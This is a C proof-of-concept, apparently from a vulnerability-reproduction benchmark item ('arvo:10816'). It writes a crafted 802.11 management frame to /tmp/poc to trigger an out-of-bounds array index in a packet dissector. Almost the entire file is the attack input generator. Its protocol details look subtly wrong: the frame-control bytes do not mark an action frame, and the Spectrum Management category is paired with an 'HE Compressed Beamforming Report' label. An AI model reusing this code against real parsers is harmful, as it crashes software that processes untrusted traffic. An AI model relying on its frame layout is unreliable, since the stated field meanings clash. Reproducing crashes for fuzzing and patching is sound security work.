#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

/* PoC for arvo:10816 */
/* Triggers: index-out-of-bounds (UBSAN) in add_ff_action() -> dissect_data_encap() */
/* Vulnerability class: index_out_of_bounds */

int main(void) {
    FILE *f = fopen("/tmp/poc", "wb");
    if (!f) { perror("fopen"); return 1; }

    /* Craft a valid 802.11ax HE Compressed Beamforming Report frame */
    /* The key is to set the Grouping field (Ng) and RU Start Index to cause an out-of-bounds array access */
    
    /* Frame Control: 0x00 0x00 (Management frame) */
    fputc(0x00, f);
    fputc(0x00, f);
    
    /* Duration: 0x00 0x00 */
    fputc(0x00, f);
    fputc(0x00, f);
    
    /* DA: 0xFF 0xFF 0xFF 0xFF 0xFF 0xFF (Broadcast) */
    for (int i = 0; i < 6; i++) fputc(0xFF, f);
    
    /* SA: 0x00 0x00 0x00 0x00 0x00 0x01 */
    fputc(0x00, f);
    fputc(0x00, f);
    fputc(0x00, f);
    fputc(0x00, f);
    fputc(0x00, f);
    fputc(0x01, f);
    
    /* BSSID: 0x00 0x00 0x00 0x00 0x00 0x00 */
    for (int i = 0; i < 6; i++) fputc(0x00, f);
    
    /* Sequence Control: 0x00 0x00 */
    fputc(0x00, f);
    fputc(0x00, f);
    
    /* Category: 0x00 (Spectrum Management) */
    fputc(0x00, f);
    
    /* Action: 0x05 (HE Compressed Beamforming Report) */
    fputc(0x05, f);
    
    /* HE Compressed Beamforming Report fields */
    /* Channel Width: 0x00 (20MHz) */
    fputc(0x00, f);
    
    /* Grouping (Ng): 0x00 (Ng=4) */
    fputc(0x00, f);
    
    /* Codebook Information: 0x00 */
    fputc(0x00, f);
    
    /* Feedback Type: 0x00 (SU Feedback) */
    fputc(0x00, f);
    
    /* RU Start Index: Set to a large value to cause out-of-bounds access */
    /* For 20MHz Ng=4, array size is 9, so index 9 or greater triggers the bug */
    fputc(0x09, f);  /* RU Start Index = 9 (out-of-bounds for scidx_20MHz_Ng4[9]) */
    
    /* RU End Index: 0x00 */
    fputc(0x00, f);
    
    /* Remaining fields: padding to make frame valid */
    for (int i = 0; i < 20; i++) fputc(0x00, f);

    fclose(f);
    return 0;
}